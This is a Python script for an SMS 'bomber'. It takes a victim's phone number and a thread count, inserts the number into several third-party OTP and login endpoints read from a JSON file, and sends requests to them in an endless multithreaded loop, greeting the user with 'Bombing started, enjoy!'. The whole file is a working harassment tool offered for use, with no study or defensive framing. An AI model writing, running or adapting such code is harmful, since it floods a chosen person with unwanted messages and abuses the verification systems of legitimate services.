import json
from time import sleep
import requests
from threading import Thread
from colorama import Fore, Style


def start_bombing(phone_number: str, targets: dict, delay: int):
    print(f"{Fore.GREEN}Bombing started, enjoy!{Style.RESET_ALL}")
    targets[0]['body_param']['phone'] = phone_number
    targets[1]['body_param']['otpMobile'] = phone_number
    targets[2]['body_param']['Phonenumber'] = f"91{phone_number}"
    targets[3]['body_param']['username'] = phone_number
    targets[4]['body_param'] = targets[4]['body_param'].replace('phone_number', phone_number)
    targets[5]['url'] = targets[5]['url'].replace('%{phone_number}%', phone_number)

    while True:
        try:
            for i in range(len(targets) - 1):
                requests.get(targets[5]['url'], headers=targets[5]['headers'])
                requests.post(targets[i]['url'], headers=targets[i]['headers'], data=targets[i]['body_param'])
                sleep(delay)
        except requests.exceptions.ConnectionError:
            print(f"{Fore.RED}Connection error, please, check your internet connection{Style.RESET_ALL}")


def main():
    file = open('./endpoints.json')
    data = json.load(file)
    phone_number = input("Target phone number (without country code): ")
    delay = float(input("Enter delay time (in seconds): "))
    number_of_threads = int(input("Enter number of threads: "))
    for nt in range(number_of_threads):
        thread = Thread(target=start_bombing, args=(phone_number, data, delay))
        thread.start()


if __name__ == '__main__':
    main()
